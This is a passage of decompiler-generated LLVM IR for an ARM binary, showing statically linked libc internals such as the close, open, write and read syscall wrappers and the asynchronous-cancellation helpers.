  call void @__pseudo_cond_branch(i1 %v2_13edc, i32 ptrtoint (i32* @global_var_10bac.522 to i32))
  br label %dec_label_pc_13eec

dec_label_pc_13eec:                               ; preds = %dec_label_pc_13e00, %.thread5
  %v0_13eec = load i32, i32* @r4, align 4
  store i32 %v3_13ddc, i32* @r4, align 4
  store i32 %v6_13ddc, i32* @r5, align 4
  store i32 %v9_13ddc, i32* @r6, align 4
  store i32 %v12_13ddc, i32* @r7, align 4
  store i32 %v15_13ddc, i32* @lr, align 4
  ret i32 %v0_13eec

; uselistorder directives
  uselistorder i32 %v0_13e54, { 1, 0 }
  uselistorder i32 %v1_13e38.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13eec, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_13e74, { 1, 0 }
  uselistorder label %dec_label_pc_13e58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13e40, { 1, 0 }
}

define i32 @function_13f00(i32 %arg1) local_unnamed_addr {
dec_label_pc_13f00:
  %v0_13f00 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13f00, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_13f00
  %v2_13f00 = load i32, i32* @r4, align 4
  %v4_13f00 = lshr i32 %v2_13f00, %arg1
  %v5_13f00 = sub i32 32, %arg1
  %v6_13f00 = shl i32 %v2_13f00, %v5_13f00
  %v7_13f00 = or i32 %v6_13f00, %v4_13f00
  %v9_13f00 = and i32 %v7_13f00, %arg1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_13f00, %bb
  %v0_13f04 = phi i32 [ %arg1, %dec_label_pc_13f00 ], [ %v9_13f00, %bb ]
  ret i32 %v0_13f04

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_13f24 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_13f24, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_13f24 = load i32, i32* @r0, align 4
  ret i32 %v2_13f24

bb1:                                              ; preds = %entry
  %v0_13f28 = call i32 @__syscall_error()
  ret i32 %v0_13f28
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13f34 = load i32, i32* @global_var_24880.525, align 4
  %v2_13f38 = icmp eq i32 %v3_13f34, 0
  store i1 %v2_13f38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f38, label %dec_label_pc_13f40, label %entry.dec_label_pc_13f5c_crit_edge

entry.dec_label_pc_13f5c_crit_edge:               ; preds = %entry
  %v3_13f5c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13f5c

dec_label_pc_13f40:                               ; preds = %entry
  %v0_13f40 = load i32, i32* @r7, align 4
  store i32 %v0_13f40, i32* @ip, align 4
  %v0_13f50 = load i32, i32* @r0, align 4
  %v2_13f50 = icmp ugt i32 %v0_13f50, -4097
  %v7_13f50 = icmp eq i32 %v0_13f50, -4096
  store i1 %v7_13f50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f50, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_13f5c, %dec_label_pc_13f40
  %merge = phi i32 [ %v0_13f50, %dec_label_pc_13f40 ], [ %v0_13f80, %dec_label_pc_13f5c ]
  ret i32 %merge

bb6:                                              ; preds = %dec_label_pc_13f40
  %v0_13f58 = call i32 @__syscall_error()
  br label %dec_label_pc_13f5c

dec_label_pc_13f5c:                               ; preds = %entry.dec_label_pc_13f5c_crit_edge, %bb6
  %v3_13f5c = phi i32 [ %v3_13f5c.pre, %entry.dec_label_pc_13f5c_crit_edge ], [ %v0_13f58, %bb6 ]
  %v9_13f5c = load i32, i32* @r7, align 4
  store i32 %v9_13f5c, i32* %stack_var_-8, align 4
  %v12_13f5c = load i32, i32* @lr, align 4
  %v0_13f60 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_13f60, i32* @ip, align 4
  store i32 %v3_13f5c, i32* @r7, align 4
  %v1_13f7c = call i32 @__libc_disable_asynccancel(i32 %v0_13f60)
  %v0_13f80 = load i32, i32* @r7, align 4
  store i32 %v0_13f80, i32* @r0, align 4
  %v2_13f84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13f84, i32* @r7, align 4
  store i32 %v12_13f5c, i32* @lr, align 4
  %v2_13f88 = icmp ugt i32 %v0_13f80, -4097
  %v7_13f88 = icmp eq i32 %v0_13f80, -4096
  store i1 %v7_13f88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f88, label %bb7, label %bb

bb7:                                              ; preds = %dec_label_pc_13f5c
  %v0_13f90 = call i32 @__syscall_error()
  %v1_13f9c = trunc i32 %v0_13f90 to i16
  %v0_13fa0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13fa0, label %bb8, label %bb9

bb8:                                              ; preds = %bb7
  %v4_13fa0 = load i32, i32* @r1, align 4
  %v5_13fa0 = inttoptr i32 %v4_13fa0 to i16*
  store i16 %v1_13f9c, i16* %v5_13fa0, align 2
  %v6_13fa0 = load i32, i32* @r4, align 4
  %v7_13fa0 = load i32, i32* @r1, align 4
  %v8_13fa0 = sub i32 %v7_13fa0, %v6_13fa0
  store i32 %v8_13fa0, i32* @r1, align 4
  br label %bb9

bb9:                                              ; preds = %bb7, %bb8
  %v10_13fa0 = sext i16 %v1_13f9c to i32
  ret i32 %v10_13fa0

; uselistorder directives
  uselistorder i16 %v1_13f9c, { 1, 0 }
  uselistorder i32 %v0_13f80, { 0, 2, 3, 1 }
  uselistorder i32 %v0_13f50, { 1, 0, 2 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %dec_label_pc_13f5c, { 1, 0 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_13fb4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_13fb4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_13fb4 = load i32, i32* @r0, align 4
  ret i32 %v2_13fb4

bb1:                                              ; preds = %entry
  %v0_13fb8 = call i32 @__syscall_error()
  ret i32 %v0_13fb8
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13fc4 = load i32, i32* @global_var_24880.525, align 4
  %v2_13fc8 = icmp eq i32 %v3_13fc4, 0
  store i1 %v2_13fc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13fc8, label %dec_label_pc_13fd0, label %entry.dec_label_pc_13fec_crit_edge

entry.dec_label_pc_13fec_crit_edge:               ; preds = %entry
  %v3_13fec.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13fec

dec_label_pc_13fd0:                               ; preds = %entry
  %v0_13fe0 = load i32, i32* @r0, align 4
  %v2_13fe0 = icmp ugt i32 %v0_13fe0, -4097
  %v7_13fe0 = icmp eq i32 %v0_13fe0, -4096
  store i1 %v7_13fe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13fe0, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_13fec, %dec_label_pc_13fd0
  %merge = phi i32 [ %v0_13fe0, %dec_label_pc_13fd0 ], [ %v0_14010, %dec_label_pc_13fec ], [ %v0_14020, %bb10 ], [ %v6_14030, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_13fd0
  %v0_13fe8 = call i32 @__syscall_error()
  br label %dec_label_pc_13fec

dec_label_pc_13fec:                               ; preds = %entry.dec_label_pc_13fec_crit_edge, %bb9
  %v3_13fec = phi i32 [ %v3_13fec.pre, %entry.dec_label_pc_13fec_crit_edge ], [ %v0_13fe8, %bb9 ]
  store i32 %v3_13fec, i32* %stack_var_-24, align 4
  %v9_13fec = load i32, i32* @r2, align 4
  %v12_13fec = load i32, i32* @r3, align 4
  %v15_13fec = load i32, i32* @r7, align 4
  store i32 %v15_13fec, i32* %stack_var_-8, align 4
  %v18_13fec = load i32, i32* @lr, align 4
  %v0_13ff0 = call i32 @__libc_enable_asynccancel()
  %v2_13ff8 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_13fec, i32* @r2, align 4
  store i32 %v12_13fec, i32* @r3, align 4
  store i32 %v2_13ff8, i32* @r7, align 4
  %v1_1400c = call i32 @__libc_disable_asynccancel(i32 %v0_13ff0)
  %v0_14010 = load i32, i32* @r7, align 4
  store i32 %v0_14010, i32* @r0, align 4
  %v2_14014 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14014, i32* @r7, align 4
  store i32 %v18_13fec, i32* @lr, align 4
  %v2_14018 = icmp ugt i32 %v0_14010, -4097
  %v7_14018 = icmp eq i32 %v0_14010, -4096
  store i1 %v7_14018, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14018, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_13fec
  %v0_14020 = call i32 @__syscall_error()
  %v0_14030 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14030, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_14030 = load i32, i32* @r1, align 4
  %v2_14030 = load i32, i32* @r4, align 4
  %v5_14030 = udiv i32 %v2_14030, 65536
  %v6_14030 = and i32 %v5_14030, %v1_14030
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14010, { 0, 2, 3, 1 }
  uselistorder i32 %v0_13fe0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13fec, { 1, 0 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_14044 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14044, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14044 = load i32, i32* @r0, align 4
  ret i32 %v2_14044

bb1:                                              ; preds = %entry
  %v0_14048 = call i32 @__syscall_error()
  ret i32 %v0_14048
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14054 = load i32, i32* @global_var_24880.525, align 4
  %v2_14058 = icmp eq i32 %v3_14054, 0
  store i1 %v2_14058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14058, label %dec_label_pc_14060, label %entry.dec_label_pc_1407c_crit_edge

entry.dec_label_pc_1407c_crit_edge:               ; preds = %entry
  %v3_1407c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1407c

dec_label_pc_14060:                               ; preds = %entry
  %v0_14070 = load i32, i32* @r0, align 4
  %v2_14070 = icmp ugt i32 %v0_14070, -4097
  %v7_14070 = icmp eq i32 %v0_14070, -4096
  store i1 %v7_14070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14070, label %bb9, label %bb

bb:                                               ; preds = %dec_label_pc_1407c, %bb10, %bb11, %dec_label_pc_14060
  %merge2 = phi i32 [ %v0_14070, %dec_label_pc_14060 ], [ %v0_140a0, %dec_label_pc_1407c ], [ %v0_140b0, %bb10 ], [ %v0_140b0, %bb11 ]
  ret i32 %merge2

bb9:                                              ; preds = %dec_label_pc_14060
  %v0_14078 = call i32 @__syscall_error()
  br label %dec_label_pc_1407c

dec_label_pc_1407c:                               ; preds = %entry.dec_label_pc_1407c_crit_edge, %bb9
  %v3_1407c = phi i32 [ %v3_1407c.pre, %entry.dec_label_pc_1407c_crit_edge ], [ %v0_14078, %bb9 ]
  %v12_1407c = load i32, i32* @r3, align 4
  %v15_1407c = load i32, i32* @r7, align 4
  store i32 %v15_1407c, i32* %stack_var_-8, align 4
  %v18_1407c = load i32, i32* @lr, align 4
  %v0_14080 = call i32 @__libc_enable_asynccancel()
  store i32 %v12_1407c, i32* @r3, align 4
  store i32 %v3_1407c, i32* @r7, align 4
  %v1_1409c = call i32 @__libc_disable_asynccancel(i32 %v0_14080)
  %v0_140a0 = load i32, i32* @r7, align 4
  store i32 %v0_140a0, i32* @r0, align 4
  %v2_140a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_140a4, i32* @r7, align 4
  store i32 %v18_1407c, i32* @lr, align 4
  %v2_140a8 = icmp ugt i32 %v0_140a0, -4097
  %v7_140a8 = icmp eq i32 %v0_140a0, -4096
  store i1 %v7_140a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140a8, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1407c
  %v0_140b0 = call i32 @__syscall_error()
  %v0_140c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_140c0, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_140b0, { 1, 0 }
  uselistorder i32 %v0_140a0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14070, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1407c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_140d4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_140d4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_140d4 = load i32, i32* @r0, align 4
  ret i32 %v2_140d4

bb1:                                              ; preds = %entry
  %v0_140d8 = call i32 @__syscall_error()
  ret i32 %v0_140d8

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_140e4 = load i32, i32* @global_var_24880.525, align 4
  %v2_140e8 = icmp eq i32 %v3_140e4, 0
  br i1 %v2_140e8, label %dec_label_pc_140f0, label %entry.dec_label_pc_1410c_crit_edge

entry.dec_label_pc_1410c_crit_edge:               ; preds = %entry
  %v3_1410c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1410c

dec_label_pc_140f0:                               ; preds = %entry
  %v0_14100 = load i32, i32* @r0, align 4
  %v2_14100 = icmp ugt i32 %v0_14100, -4097
  br i1 %v2_14100, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_1410c, %dec_label_pc_140f0
  %merge = phi i32 [ %v0_14100, %dec_label_pc_140f0 ], [ %v0_14130, %dec_label_pc_1410c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_140f0
  %v0_14108 = call i32 @__syscall_error()
  br label %dec_label_pc_1410c

dec_label_pc_1410c:                               ; preds = %entry.dec_label_pc_1410c_crit_edge, %bb8
  %v3_1410c = phi i32 [ %v3_1410c.pre, %entry.dec_label_pc_1410c_crit_edge ], [ %v0_14108, %bb8 ]
  %v6_1410c = load i32, i32* @r1, align 4
  %v15_1410c = load i32, i32* @r7, align 4
  store i32 %v15_1410c, i32* %stack_var_-8, align 4
  %v18_1410c = load i32, i32* @lr, align 4
  %v0_14110 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_1410c, i32* @r1, align 4
  store i32 %v3_1410c, i32* @r7, align 4
  %v1_1412c = call i32 @__libc_disable_asynccancel(i32 %v0_14110)
  %v0_14130 = load i32, i32* @r7, align 4
  store i32 %v0_14130, i32* @r0, align 4
  %v2_14134 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14134, i32* @r7, align 4
  store i32 %v18_1410c, i32* @lr, align 4
  %v2_14138 = icmp ugt i32 %v0_14130, -4097
  br i1 %v2_14138, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_1410c
  %v0_14140 = call i32 @__syscall_error()
  ret i32 %v0_14140

; uselistorder directives
  uselistorder i32 %v0_14130, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 3, 2, 11, 7, 6, 10, 1, 0, 9, 5, 4, 8 }
  uselistorder label %dec_label_pc_1410c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_14150 = load i32, i32* %r0.global-to-local, align 4
  %v1_14150 = and i32 %v0_14150, 2
  %v2_14150 = icmp eq i32 %v1_14150, 0
  %v3_14154 = load i32, i32* @r4, align 4
  store i32 %v3_14154, i32* %stack_var_-16, align 4
  br i1 %v2_14150, label %dec_label_pc_1415c, label %dec_label_pc_141d0

dec_label_pc_1415c:                               ; preds = %entry
  %v0_1415c = call i32 @__aeabi_read_tp()
  store i32 %v0_1415c, i32* %r0.global-to-local, align 4
  %v1_14160 = add i32 %v0_1415c, -1036
  %v2_14160 = inttoptr i32 %v1_14160 to i32*
  %v3_14160 = load i32, i32* %v2_14160, align 4
  %v1_14164 = add i32 %v0_1415c, -1168
  store i32 %v1_14164, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14168

dec_label_pc_14168:                               ; preds = %dec_label_pc_1419c.dec_label_pc_14168_crit_edge, %dec_label_pc_1415c
  %v0_14174 = phi i32 [ %v0_14174.pre, %dec_label_pc_1419c.dec_label_pc_14168_crit_edge ], [ %v1_14164, %dec_label_pc_1415c ]
  %v0_14168 = phi i32 [ %v0_1419c, %dec_label_pc_1419c.dec_label_pc_14168_crit_edge ], [ %v3_14160, %dec_label_pc_1415c ]
  %v1_14168 = and i32 %v0_14168, -3
  store i32 %v1_14168, i32* %r7.global-to-local, align 4
  store i32 %v0_14168, i32* %r4.global-to-local, align 4
  store i32 %v1_14168, i32* @r1, align 4
  %v1_14174 = add i32 %v0_14174, 132
  store i32 %v1_14174, i32* @r2, align 4
  %v1_1417823 = inttoptr i32 %v1_14174 to i32*
  %v2_1417824 = load i32, i32* %v1_1417823, align 4
  %v3_1417c26 = icmp uge i32 %v2_1417824, %v0_14168
  store i1 %v3_1417c26, i1* %cpsr_c.global-to-local, align 1
  %v9_1417c32 = icmp eq i32 %v2_1417824, %v0_14168
  br i1 %v9_1417c32, label %dec_label_pc_14184, label %dec_label_pc_1419c

dec_label_pc_14184:                               ; preds = %dec_label_pc_14168, %dec_label_pc_14184.dec_label_pc_14178_crit_edge
  %v0_1418433 = phi i32 [ %v1_1417c.pre, %dec_label_pc_14184.dec_label_pc_14178_crit_edge ], [ %v0_14168, %dec_label_pc_14168 ]
  store i32 %v0_1418433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14194 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14194, label %dec_label_pc_14198, label %dec_label_pc_14184.dec_label_pc_14178_crit_edge

dec_label_pc_14184.dec_label_pc_14178_crit_edge:  ; preds = %dec_label_pc_14184
  %v0_14178.pre = load i32, i32* @r2, align 4
  %v1_1417c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14178 = inttoptr i32 %v0_14178.pre to i32*
  %v2_14178 = load i32, i32* %v1_14178, align 4
  %v3_1417c = icmp uge i32 %v2_14178, %v1_1417c.pre
  store i1 %v3_1417c, i1* %cpsr_c.global-to-local, align 1
  %v9_1417c = icmp eq i32 %v2_14178, %v1_1417c.pre
  br i1 %v9_1417c, label %dec_label_pc_14184, label %dec_label_pc_1419c

dec_label_pc_14198:                               ; preds = %dec_label_pc_14184
  %v0_14198 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1419c

dec_label_pc_1419c:                               ; preds = %dec_label_pc_14168, %dec_label_pc_14184.dec_label_pc_14178_crit_edge, %dec_label_pc_14198
  %v0_1419c = phi i32 [ %v0_14198, %dec_label_pc_14198 ], [ %v2_1417824, %dec_label_pc_14168 ], [ %v2_14178, %dec_label_pc_14184.dec_label_pc_14178_crit_edge ]
  %v1_1419c = phi i32 [ %v0_14198, %dec_label_pc_14198 ], [ %v0_14168, %dec_label_pc_14168 ], [ %v1_1417c.pre, %dec_label_pc_14184.dec_label_pc_14178_crit_edge ]
  %v3_1419c = icmp uge i32 %v0_1419c, %v1_1419c
  store i1 %v3_1419c, i1* %cpsr_c.global-to-local, align 1
  %v9_1419c = icmp eq i32 %v0_1419c, %v1_1419c
  br i1 %v9_1419c, label %dec_label_pc_141c4.preheader, label %dec_label_pc_1419c.dec_label_pc_14168_crit_edge

dec_label_pc_1419c.dec_label_pc_14168_crit_edge:  ; preds = %dec_label_pc_1419c
  %v0_14174.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14168

dec_label_pc_141c4.preheader:                     ; preds = %dec_label_pc_1419c
  %v0_141c41 = load i32, i32* %r7.global-to-local, align 4
  %v1_141c42 = and i32 %v0_141c41, 12
  store i32 %v1_141c42, i32* @r3, align 4
  %v2_141c83 = icmp ugt i32 %v1_141c42, 3
  store i1 %v2_141c83, i1* %cpsr_c.global-to-local, align 1
  %v7_141c85 = icmp eq i32 %v1_141c42, 4
  br i1 %v7_141c85, label %dec_label_pc_141a8.lr.ph, label %dec_label_pc_141c4.preheader.dec_label_pc_141d0.loopexit_crit_edge

dec_label_pc_141c4.preheader.dec_label_pc_141d0.loopexit_crit_edge: ; preds = %dec_label_pc_141c4.preheader
  %v1_141d4.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_141d0.loopexit

dec_label_pc_141a8.lr.ph:                         ; preds = %dec_label_pc_141c4.preheader
  %v0_141ac.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_141ac = add i32 %v0_141ac.pre, 132
  %v2_141c0 = inttoptr i32 %v1_141ac to i32*
  br label %dec_label_pc_141a8

dec_label_pc_141a8:                               ; preds = %dec_label_pc_141a8.lr.ph, %dec_label_pc_141a8
  %v0_141a8 = phi i32 [ %v0_141c41, %dec_label_pc_141a8.lr.ph ], [ %v3_141c0, %dec_label_pc_141a8 ]
  store i32 %v0_141a8, i32* @r2, align 4
  store i32 %v1_141ac, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_141c0 = load i32, i32* %v2_141c0, align 4
  store i32 %v3_141c0, i32* %r7.global-to-local, align 4
  %v1_141c4 = and i32 %v3_141c0, 12
  store i32 %v1_141c4, i32* @r3, align 4
  %v7_141c8 = icmp eq i32 %v1_141c4, 4
  br i1 %v7_141c8, label %dec_label_pc_141a8, label %dec_label_pc_141c4.dec_label_pc_141d0.loopexit_crit_edge

dec_label_pc_141c4.dec_label_pc_141d0.loopexit_crit_edge: ; preds = %dec_label_pc_141a8
  %v2_141c8 = icmp ugt i32 %v1_141c4, 3
  store i1 %v2_141c8, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_141d0.loopexit

dec_label_pc_141d0.loopexit:                      ; preds = %dec_label_pc_141c4.preheader.dec_label_pc_141d0.loopexit_crit_edge, %dec_label_pc_141c4.dec_label_pc_141d0.loopexit_crit_edge
  %v1_141d4.pre = phi i32 [ %v1_141d4.pre.pre, %dec_label_pc_141c4.preheader.dec_label_pc_141d0.loopexit_crit_edge ], [ %v1_141ac, %dec_label_pc_141c4.dec_label_pc_141d0.loopexit_crit_edge ]
  %v2_141d0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_141d0

dec_label_pc_141d0:                               ; preds = %dec_label_pc_141d0.loopexit, %entry
  %v1_141d4 = phi i32 [ %v1_141d4.pre, %dec_label_pc_141d0.loopexit ], [ %v0_14150, %entry ]
  %v2_141d0 = phi i32 [ %v2_141d0.pre, %dec_label_pc_141d0.loopexit ], [ %v3_14154, %entry ]
  store i32 %v2_141d0, i32* @r4, align 4
  ret i32 %v1_141d4

; uselistorder directives
  uselistorder i32 %v3_141c0, { 1, 2, 0 }
  uselistorder i32 %v1_141ac, { 0, 2, 1 }
  uselistorder i32 %v0_14198, { 1, 0 }
  uselistorder i32 %v1_1417c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14168, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_141d0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_141a8, { 1, 0 }
  uselistorder label %dec_label_pc_1419c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14184, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_141d8 = load i32, i32* @r4, align 4
  store i32 %v3_141d8, i32* %stack_var_-24, align 4
  store i32 54436, i32* %r8.global-to-local, align 4
  %v0_141e0 = call i32 @__aeabi_read_tp()
  %v1_141e4 = add i32 %v0_141e0, -1036
  %v2_141e4 = inttoptr i32 %v1_141e4 to i32*
  %v3_141e4 = load i32, i32* %v2_141e4, align 4
  store i32 %v3_141e4, i32* %r6.global-to-local, align 4
  %v1_141e8 = add i32 %v0_141e0, -1168
  store i32 %v1_141e8, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r8.global-to-local, align 4
  %v1_141f046 = or i32 %v3_141e4, 2
  store i32 %v1_141f046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_141f449 = icmp eq i32 %v1_141f046, %v3_141e4
  br i1 %v9_141f449, label %dec_label_pc_142a0, label %dec_label_pc_141fc

dec_label_pc_141fc:                               ; preds = %entry, %bb.dec_label_pc_141fc_crit_edge
  %v0_14200 = phi i32 [ %v0_14200.pre, %bb.dec_label_pc_141fc_crit_edge ], [ %v1_141e8, %entry ]
  %v1_141f051 = phi i32 [ %v1_141f0, %bb.dec_label_pc_141fc_crit_edge ], [ %v1_141f046, %entry ]
  %v0_1420450 = phi i32 [ %v1_14230, %bb.dec_label_pc_141fc_crit_edge ], [ %v3_141e4, %entry ]
  store i32 %v1_141f051, i32* @r1, align 4
  %v1_14200 = add i32 %v0_14200, 132
  store i32 %v1_14200, i32* @r2, align 4
  store i32 %v0_1420450, i32* %r4.global-to-local, align 4
  %v1_1420834 = inttoptr i32 %v1_14200 to i32*
  %v2_1420835 = load i32, i32* %v1_1420834, align 4
  store i32 %v2_1420835, i32* @r3, align 4
  %v3_1420c37 = icmp uge i32 %v2_1420835, %v0_1420450
  store i1 %v3_1420c37, i1* %cpsr_c.global-to-local, align 1
  %v9_1420c43 = icmp eq i32 %v2_1420835, %v0_1420450
  br i1 %v9_1420c43, label %dec_label_pc_14214, label %dec_label_pc_1422c

dec_label_pc_14214:                               ; preds = %dec_label_pc_141fc, %dec_label_pc_14214.dec_label_pc_14208_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14224 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14224, label %dec_label_pc_14228, label %dec_label_pc_14214.dec_label_pc_14208_crit_edge

dec_label_pc_14214.dec_label_pc_14208_crit_edge:  ; preds = %dec_label_pc_14214
  %v0_14208.pre = load i32, i32* @r2, align 4
  %v1_1420c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14208 = inttoptr i32 %v0_14208.pre to i32*
  %v2_14208 = load i32, i32* %v1_14208, align 4
  store i32 %v2_14208, i32* @r3, align 4
  %v3_1420c = icmp uge i32 %v2_14208, %v1_1420c.pre
  store i1 %v3_1420c, i1* %cpsr_c.global-to-local, align 1
  %v9_1420c = icmp eq i32 %v2_14208, %v1_1420c.pre
  br i1 %v9_1420c, label %dec_label_pc_14214, label %dec_label_pc_1422c

dec_label_pc_14228:                               ; preds = %dec_label_pc_14214
  %v0_14228 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14228, i32* @r3, align 4
  br label %dec_label_pc_1422c

dec_label_pc_1422c:                               ; preds = %dec_label_pc_141fc, %dec_label_pc_14214.dec_label_pc_14208_crit_edge, %dec_label_pc_14228
  %v1_14230 = phi i32 [ %v0_14228, %dec_label_pc_14228 ], [ %v2_1420835, %dec_label_pc_141fc ], [ %v2_14208, %dec_label_pc_14214.dec_label_pc_14208_crit_edge ]
  %v1_1422c = load i32, i32* %r6.global-to-local, align 4
  %v3_1422c = icmp uge i32 %v1_14230, %v1_1422c
  store i1 %v3_1422c, i1* %cpsr_c.global-to-local, align 1
  %v9_1422c = icmp eq i32 %v1_14230, %v1_1422c
  br i1 %v9_1422c, label %dec_label_pc_14238, label %bb

bb:                                               ; preds = %dec_label_pc_1422c
  store i32 %v1_14230, i32* %r6.global-to-local, align 4
  %v1_141f0 = or i32 %v1_14230, 2
  store i32 %v1_141f0, i32* %r5.global-to-local, align 4
